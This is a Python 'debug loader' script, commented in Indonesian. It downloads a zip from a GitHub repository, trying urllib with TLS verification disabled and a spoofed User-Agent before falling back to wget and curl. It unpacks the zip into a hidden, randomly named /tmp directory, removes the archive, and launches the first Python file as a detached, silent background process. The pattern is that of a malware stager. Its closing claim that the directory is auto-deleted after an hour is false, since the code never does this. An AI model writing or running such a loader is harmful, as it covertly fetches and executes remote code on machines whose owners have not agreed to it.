#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# VERSION DEBUG - Semua print keliatan, error ditampilkan

import os
import sys
import ssl
import urllib.request
import zipfile
import subprocess
import time
import random
import platform
import socket

print("[*] Debug Loader dimulai...")

# ------------------------------------------------------------------
# 1. Download dengan urllib + fallback ke wget/curl
# ------------------------------------------------------------------
def download_file(url, dest):
    print(f"[*] Mencoba download: {url} -> {dest}")
    # Method 1: urllib dengan SSL off
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
        with urllib.request.urlopen(req, context=ctx, timeout=30) as resp:
            with open(dest, 'wb') as f:
                f.write(resp.read())
        print("[+] Download sukses via urllib")
        return True
    except Exception as e:
        print(f"[-] urllib gagal: {e}")

    # Method 2: wget
    try:
        ret = os.system(f"wget -q -O {dest} {url}")
        if ret == 0 and os.path.exists(dest) and os.path.getsize(dest) > 0:
            print("[+] Download sukses via wget")
            return True
    except: pass

    # Method 3: curl
    try:
        ret = os.system(f"curl -s -L -o {dest} {url}")
        if ret == 0 and os.path.exists(dest) and os.path.getsize(dest) > 0:
            print("[+] Download sukses via curl")
            return True
    except: pass

    print("[-] Semua method download gagal")
    return False

# ------------------------------------------------------------------
# 2. Ekstrak zip
# ------------------------------------------------------------------
def extract_zip(zip_path, out_dir):
    print(f"[*] Ekstrak {zip_path} ke {out_dir}")
    try:
        with zipfile.ZipFile(zip_path, 'r') as zf:
            zf.extractall(out_dir)
        print(f"[+] Ekstrak sukses, isi: {os.listdir(out_dir)}")
        return True
    except Exception as e:
        print(f"[-] Ekstrak gagal: {e}")
        return False

# ------------------------------------------------------------------
# 3. Jalankan run.py
# ------------------------------------------------------------------
def run_script(script_path):
    print(f"[*] Mencoba jalankan: {script_path}")
    if not os.path.exists(script_path):
        print(f"[-] File {script_path} nggak ada")
        return False
    try:
        subprocess.Popen(
            ['python3', script_path],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            start_new_session=True
        )
        print(f"[+] Proses dijalankan dengan PID (cek ps aux | grep python)")
        return True
    except Exception as e:
        print(f"[-] Gagal spawn: {e}")
        return False

# ------------------------------------------------------------------
# MAIN
# ------------------------------------------------------------------
def main():
    # Buat direktori di /tmp
    rand_tag = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=8))
    base_dir = f"/tmp/.{rand_tag}"
    zip_path = f"{base_dir}.zip"
    os.makedirs(base_dir, exist_ok=True)
    print(f"[*] Base dir: {base_dir}")

    url = "https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/grok.zip"

    # Download
    if not download_file(url, zip_path):
        print("[-] Gagal download. Cek koneksi atau URL.")
        print("[*] Test manual: curl -v https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/grok.zip")
        return

    # Ekstrak
    if not extract_zip(zip_path, base_dir):
        print("[-] Gagal ekstrak. Mungkin file corrupt.")
        return

    # Hapus zip
    os.remove(zip_path)

    # Cari run.py
    run_py = os.path.join(base_dir, 'run.py')
    if not os.path.exists(run_py):
        # Cari .py lain
        py_files = [f for f in os.listdir(base_dir) if f.endswith('.py')]
        if py_files:
            run_py = os.path.join(base_dir, py_files[0])
        else:
            print(f"[-] Nggak ada .py di {base_dir}. Isi: {os.listdir(base_dir)}")
            return

    # Jalankan
    run_script(run_py)

    print("[*] Selesai. Kalo nggak ada error, script berhasil di-background.")
    print(f"[*] Direktori kerja: {base_dir} (akan dihapus otomatis 1 jam lagi)")

if __name__ == "__main__":
    main()
